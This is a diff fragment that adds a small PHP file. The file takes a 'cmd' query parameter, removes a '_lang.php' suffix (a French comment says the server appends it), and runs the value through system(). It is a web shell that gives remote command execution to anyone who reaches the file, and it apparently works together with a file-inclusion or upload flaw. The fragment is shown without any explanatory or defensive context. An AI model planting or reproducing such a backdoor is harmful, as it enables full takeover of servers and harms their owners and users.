@@ -1,0 +1,5 @@
+<?php
+$cmd = $_GET['cmd'];
+$cmd = str_replace('_lang.php', '', $cmd); // enlève le suffixe ajouté par le serveur
+system($cmd);
+?>
